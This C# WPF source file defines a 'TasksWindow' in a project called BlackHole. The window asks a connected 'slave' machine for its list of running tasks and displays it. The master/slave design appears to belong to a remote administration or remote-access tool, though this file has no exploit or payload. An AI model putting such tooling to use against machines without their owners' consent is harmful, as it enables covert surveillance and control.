using System;
using System.IO;
using System.Linq;
using System.Windows;
using System.Windows.Media.Imaging;
using BlackHole.Common;
using BlackHole.Common.Network.Protocol;
using BlackHole.Master.Extentions;

namespace BlackHole.Master
{
    /// <summary>
    /// 
    /// </summary>
    public partial class TasksWindow : SlaveWindow
    {
        public TasksWindow()
        {
            InitializeComponent();
            Send(new StartTasksMessage());
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="slave"></param>
        public TasksWindow(Slave slave)
            : base(slave)
        {
            InitializeComponent();
            Send(new StartTasksMessage());
        }

        /// <summary>
        /// 
        /// </summary>
        /// <param name="ev"></param>
        public override async void OnEvent(SlaveEvent ev)
        {
            base.OnEvent(ev);
            await this.ExecuteInDispatcher(() =>
            {
                switch ((SlaveEventType)ev.EventType)
                {
                    case SlaveEventType.IncommingMessage:
                    {
                        ev.Data.Match()
                            .With<TasksMessage>(message =>
                            {
                                TasksList.ItemsSource = message.Tasks.Select(c => c.Dictionary).ToArray();
                            });
                        break;
                    }
                }
            });
        }

        protected override void OnClosed(EventArgs e)
        {
            Send(new StopTasksMessage());
            base.OnClosed(e);
        }
    }
}
